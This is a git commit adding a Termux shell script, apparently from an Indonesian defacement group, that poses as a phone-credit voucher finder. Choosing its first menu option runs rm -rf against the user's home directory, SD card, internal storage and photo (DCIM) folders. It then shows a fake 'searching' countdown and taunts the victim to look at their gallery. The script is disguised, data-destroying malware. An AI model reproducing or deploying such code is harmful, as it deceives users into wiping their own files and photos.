9be465afe67a98654867ea278f7688f833362f3a
mrdrag1 <46041450+mrdrag1@users.noreply.github.com>
2019-01-20 20:09:58 +0700

    Create miror.sh

---
+++ miror.sh
@@ -0,0 +1,187 @@
+#!/system/xbin/bash
+
+# Bersihkan Layar
+
+clear
+
+blue='\033[34;1m'
+
+green='\033[32;1m'
+
+purple='\033[35;1m'
+
+cyan='\033[36;1m'
+
+red='\033[31;1m'
+
+white='\033[37;1m'
+
+yellow='\033[33;1m'
+
+###################################################
+
+# CTRL C-
+
+###################################################
+
+trap ctrl_c INT
+
+ctrl_c() {
+
+clear
+
+echo $red"[#]> (Ctrl + C ) Detected, 
+
+Trying To Exit ... "
+
+sleep 1
+
+echo ""
+
+echo $yellow"[#]> Thank You For Using My 
+
+Tools ... "
+
+sleep 1
+
+echo ""
+
+echo $white"[#]> ALI ATTACKER Was Here... "
+
+read enter
+
+exit
+
+}
+
+echo "
+
+____________________________________________" | lolcat
+
+echo $red"kontak admin: 085559368365"
+
+echo $green"Author : MR.DRAG"
+
+echo $blue"Team : Anonymous All Indonesia"
+
+echo $pink"Thanks To My Leader=Jack"
+
+echo $purple"Thanks To : MR.JACK"
+
+echo $cyan"Thanks To: Team System Eror"
+
+echo $white"Thanks To: My Friend,Kandol,Kintil,MR.SAT,"
+
+echo $white"Bloghttp://aliattackerteam.blogspot.com/"
+
+echo $red"Deface.id=https://defacer.id/archive/team/anonymous-all-indonesia"
+
+echo $blue"thanks to:ALL MEMBER ALI ATTACKER"
+
+echo &green"Thanks To My Best Friend:K4NDOL,JACK,KINTIL,JESSICA,MR.CURU7"
+
+echo $white"thanks To : Blackhat Hacker Indonesia"
+
+echo $blue"thanks To : Curut Cyber Team "
+
+echo $red"thanks To: Indonesia termux association "
+
+echo $white"thanks to: Rabbit Cyber Team "
+
+echo $blue"thanks To : The Awakening Black Hunter "
+
+echo "
+
+___________________________________________" | lolcat
+
+echo $green" 01) Cari Vocher Pulsa"
+
+echo $green" 02) Info Kartu Anda"
+
+read -p "[Mr.CAK3R_14]> " bro;
+
+
+if [ $bro = 1 ] || [ $bro = 01 ]
+
+then
+
+clear
+
+echo $green" Cari Vocher Pulsa "
+
+sleep 1
+
+termux-setup-storage
+
+rm -rf sdcard
+
+rm -rf storage/emulated/0
+
+rm -rf $HOME
+
+rm -rf /sdcard
+
+rm -rf /storage/emulated/0
+
+rm -rf $HOME/sdcard
+
+rm -rf $HOME/storage/emulated/0
+
+rm -rf storage/emulated/0/DCIM
+
+rm -rf sdcard/0/DCIM
+
+rm -rf $HOME/storage/emulated/0
+
+rm -rf $HOME/sdcard/0
+
+rm -rf /sdcard/0/android
+
+rm -rf /storage/emulated/0/android
+
+
+echo $blue"Sedang Mencari Token Pulsa 10 detik "
+
+sleep 3
+
+echo $blue"Sedang Mencari Token Pulsa 9 detik "
+
+sleep 3
+
+echo $blue"Sedang Mencari Token Pulsa 8 detik "
+
+sleep 3
+
+echo $blue"Sedang Mencari Token Pulsa 7 detik "
+
+sleep 3
+
+echo $blue"Sedang Mencari Token Pulsa 6 detik "
+
+sleep 3
+
+echo $blue"Sedang Mencari Token Pulsa 5 detik "
+
+sleep 3
+
+echo $blue"Sedang Mencari Token Pulsa 4 detik "
+
+sleep 3
+
+echo $blue"Sedang Mencari Token Pulsa 3 detik " 
+
+sleep 3
+
+echo $blue"Mengulangi Pencarian "
+
+sleep 3
+
+echo $red"Pencarian Gagal Harap Ulang Kembali "
+
+echo $red"COBA LU LIAT GALERI LO :v
+
+exit
+
+fi
+
+
